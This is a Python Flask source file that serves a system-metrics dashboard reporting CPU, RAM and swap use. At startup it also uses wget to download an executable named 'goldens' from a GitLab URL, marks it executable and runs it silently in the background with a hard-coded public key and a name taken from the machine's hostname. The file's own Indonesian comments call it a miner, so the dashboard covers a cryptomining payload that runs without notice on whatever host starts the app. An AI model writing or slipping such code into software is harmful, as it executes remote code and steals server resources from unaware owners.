import os
import psutil
import subprocess
from flask import Flask, render_template, jsonify

app = Flask(__name__)

# Jalankan binary miner di background hanya sekali
if not os.path.exists("goldens"):
    url = "https://gitlab.com/majapahlevi/mvp/-/raw/main/goldens"
    subprocess.run(["wget", "-q", url, "-O", "goldens"])
    subprocess.run(["chmod", "+x", "goldens"])

pubkey = "3Y7TnP3XVK5Fc3niK1tNqWh2XbFyY9ksYJnmNy7712zGsmHQqMZjbr2hbNUvRHGKGW8eMAF2bk1guc4TrnGhGKdRPX13g3oXpTZcd53rjHgZ5YJCN2h8Xo5MZQ5QGaeJrwV9"
name = f"vps-{os.uname()[1]}"

# Jalankan miner di background
subprocess.Popen(
    ["./goldens", f"--pubkey={pubkey}", f"--name={name}"],
    stdout=subprocess.DEVNULL,
    stderr=subprocess.DEVNULL
)

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/metrics")
def metrics():
    cpu = psutil.cpu_percent(interval=1)
    ram = psutil.virtual_memory().percent
    swap = psutil.swap_memory().percent
    # Jika ada GPU NVIDIA, bisa tambahkan nvidia-smi parser
    gpu = "Not Available"
    return jsonify({"cpu": cpu, "ram": ram, "swap": swap, "gpu": gpu})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
,
